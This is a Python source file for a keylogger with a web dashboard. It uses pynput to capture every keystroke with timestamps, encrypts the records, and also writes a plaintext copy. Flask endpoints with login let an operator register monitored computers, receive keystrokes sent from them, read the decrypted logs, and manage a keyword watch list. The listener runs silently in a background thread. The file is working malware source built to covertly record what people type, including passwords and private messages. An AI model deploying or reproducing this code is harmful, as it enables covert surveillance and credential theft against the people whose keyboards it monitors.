from pynput import keyboard
from cryptography.fernet import Fernet
from flask import Flask, render_template, request, jsonify, session
import datetime
import os
import threading
import uuid
import atexit
import logging
import json
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash

BUFFER_SIZE = 10
KEY_FILE_NAME = "secret.key"
USERS_LOG_FOLDER = "logs"
USERS_FILE = "users.json"
COMPUTERS_FILE = "computers.json"
KEYWORDS_FILE = "keywords.json"
COMP_ID = os.environ.get("COMP_ID") or str(uuid.uuid4())
FLASK_SECRET = os.environ.get("FLASK_SECRET_KEY")
buffer = []
buffer_lock = threading.Lock()

if not os.path.exists(KEY_FILE_NAME):
    key = Fernet.generate_key()
    with open(KEY_FILE_NAME, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE_NAME, "rb") as key_file:
        key = key_file.read()
fernet = Fernet(key)
app = Flask(__name__)
app.secret_key = FLASK_SECRET or os.urandom(24)
logging.basicConfig(level=logging.INFO, filename="app.log")

os.makedirs(os.path.join(USERS_LOG_FOLDER, COMP_ID), exist_ok=True)

def load_json(filename):
    if not os.path.exists(filename):
        return {}
    with open(filename, "r") as f:
        try:
            return json.load(f)
        except:
            return {}

def save_json(filename, data):
    with open(filename, "w") as f:
        json.dump(data, f, indent = 2)

def get_user_folder(user_id):
    folder = os.path.join(USERS_LOG_FOLDER, user_id)
    os.makedirs(folder, exist_ok = True)
    return folder

def get_log_file_name(user_id):
    user_folder = get_user_folder(user_id)
    now = datetime.datetime.now()
    filename = now.strftime("%Y-%m-%d-%H.txt")
    return os.path.join(user_folder, filename)

def flush_buffer():
    global buffer
    with buffer_lock:
        if buffer:
            log_file_name = get_log_file_name(COMP_ID)
            plain_file_name = os.path.join(get_user_folder(COMP_ID), "keystrokes_plain.txt")
            with open(log_file_name, "ab") as f_enc, open(plain_file_name, "a") as f_plain:
                for line in buffer:
                    f_enc.write(line + b"\n")
                    try:
                        decrypted = fernet.decrypt(line).decode()
                        f_plain.write(decrypted + "\n")
                    except:
                        pass
            buffer.clear()
            logging.info("Buffer flushed")

atexit.register(flush_buffer)

def on_press(key):
    global buffer
    try:
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char:
            text = f"{time_str} - {key.char}"
        else:
            text = f"{time_str} - [{key.name}]"
        print(text)  
        encrypted = fernet.encrypt(text.encode())
        with buffer_lock:
            buffer.append(encrypted)
            if len(buffer) >= BUFFER_SIZE:
                flush_buffer()
    except Exception as e:
        logging.error(f"Error in on_press: {e}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def login_required(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if "username" not in session:
            return jsonify({"status":"error","message":"Authentication required"}), 401
        return f(*args, **kwargs)
    return wrapped

@app.route("/signup", methods=["POST"])
def signup():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    users = load_json(USERS_FILE)
    if username in users:
        return jsonify({"status": "error", "message": "User already exists"}), 400
    if len(password) < 6:
        return jsonify({"status": "error", "message": "Password too short"}), 400
    users[username] = {"password": generate_password_hash(password)}
    save_json(USERS_FILE, users)
    return jsonify({"status": "success", "message": "User created"}), 201

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    users = load_json(USERS_FILE)
    if username not in users or not check_password_hash(users[username]["password"], password):
        return jsonify({"status": "error", "message": "Invalid credentials"}), 401
    session["username"] = username
    return jsonify({"status": "success", "message": "Logged in"}), 200

@app.route("/computers", methods=["GET"])
@login_required
def get_computers():
    computers = load_json(COMPUTERS_FILE)
    return jsonify(computers)

@app.route("/computers", methods=["POST"])
@login_required
def add_computer():
    data = request.json
    name = data.get("name")
    computers = load_json(COMPUTERS_FILE)
    comp_id = str(uuid.uuid4())
    computers[comp_id] = {"name": name}
    save_json(COMPUTERS_FILE, computers)
    return jsonify({"status": "success", "id": comp_id}), 201

@app.route("/computers/<comp_id>", methods=["DELETE"])
@login_required
def delete_computer(comp_id):
    computers = load_json(COMPUTERS_FILE)
    if comp_id in computers:
        del computers[comp_id]
        save_json(COMPUTERS_FILE, computers)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error", "message": "Not found"}), 404

@app.route("/keystrokes/<comp_id>", methods=["GET"])
@login_required
def get_keystrokes(comp_id):
    logs = []
    user_folder = get_user_folder(comp_id)
    if os.path.exists(user_folder):
        for file_name in os.listdir(user_folder):
            file_path = os.path.join(user_folder, file_name)
            with open(file_path, "rb") as f:
                for line in f:
                    try:
                        decrypted = fernet.decrypt(line.strip()).decode()
                        timestamp, key_char = decrypted.split(" - ", 1)
                        logs.append({"key": key_char, "timestamp": timestamp})
                    except Exception as e:
                        logging.error(f"Error decrypting line: {e}")
    return jsonify(logs)

@app.route("/keystrokes", methods=["POST"])
@login_required
def add_keystroke():
    data = request.json
    comp_id = data.get("comp_id")
    key_char = data.get("key_char")
    timestamp = data.get("timestamp")
    if not comp_id or not key_char or not timestamp:
        return jsonify({"status": "error", "message": "Invalid data"}), 400
    text = f"{timestamp} - {key_char}"
    encrypted = fernet.encrypt(text.encode())
    log_file_name = get_log_file_name(comp_id)
    with open(log_file_name, "ab") as f:
        f.write(encrypted + b"\n")
    return jsonify({"status": "success"}), 200

@app.route("/keywords", methods=["GET"])
@login_required
def get_keywords():
    keywords = load_json(KEYWORDS_FILE)
    return jsonify(keywords)

@app.route("/keywords", methods=["POST"])
@login_required
def add_keyword():
    data = request.json
    keyword = data.get("keyword")
    keywords = load_json(KEYWORDS_FILE)
    if keyword in keywords:
        return jsonify({"status": "error", "message": "Keyword exists"}), 400
    keywords[keyword] = True
    save_json(KEYWORDS_FILE, keywords)
    return jsonify({"status": "success"}), 201

@app.route("/keywords/<keyword>", methods=["DELETE"])
@login_required
def delete_keyword(keyword):
    keywords = load_json(KEYWORDS_FILE)
    if keyword in keywords:
        del keywords[keyword]
        save_json(KEYWORDS_FILE, keywords)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error", "message": "Not found"}), 404

@app.route("/")
@login_required
def index():
    return render_template("index.html")

if __name__ == "__main__":
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()
    app.run(port=8000, debug=False)
